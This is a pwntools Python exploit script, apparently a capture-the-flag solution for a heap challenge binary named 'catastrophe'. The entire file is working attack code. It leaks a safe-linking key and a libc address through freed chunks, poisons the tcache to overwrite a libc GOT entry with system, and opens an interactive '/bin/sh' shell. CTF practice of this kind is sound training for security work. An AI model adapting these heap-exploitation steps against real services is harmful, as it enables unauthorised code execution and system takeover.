#!/usr/bin/env python3

from pwn import *

exe = ELF("../bin/catastrophe")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

host = args.HOST or 'localhost'
port = args.PORT or 31273

def local():
  return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
'''

r = conn()

# good luck pwning :)

def malloc(idx, size, content=b''):
  r.sendline(b'1')
  r.sendline(str(idx).encode())
  r.sendline(str(size).encode())
  r.sendline(content)

def free(idx):
  r.sendline(b'2')
  r.sendline(str(idx).encode())

def view(idx):
  r.sendline(b'3')
  r.sendline(str(idx).encode())

def decrypt(ct):
  key = 0
  for i in range(1, 6):
    bits = max(64 - 12 * i, 0)
    pt = ((ct ^ key) >> bits) << bits
    key = pt >> 12
  return pt, key

for k in range(9):
  malloc(k, 256)

malloc(9, 16)

for k in range(7):
  free(k)

r.clean()
view(1)
r.recvuntil(b'Index?')
r.recvuntil(b'> ')
_, key = decrypt(u64(r.recv(6).ljust(8, b'\x00')))

free(8)
r.clean()
view(8)
r.recvuntil(b'Index?')
r.recvuntil(b'> ')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - 0x219ce0
log.info(hex(libc.address))

free(7)
malloc(9, 256)
free(8)

got = libc.address + 0x219098
log.info(hex(got))
malloc(9, 512, b'A'*0x110 + p64((got-8) ^ key)) # -8 for alignment
malloc(0, 256)
malloc(9, 256, flat([b'/bin/sh\0', libc.sym['system']]))
view(9)

r.clean()
r.interactive()
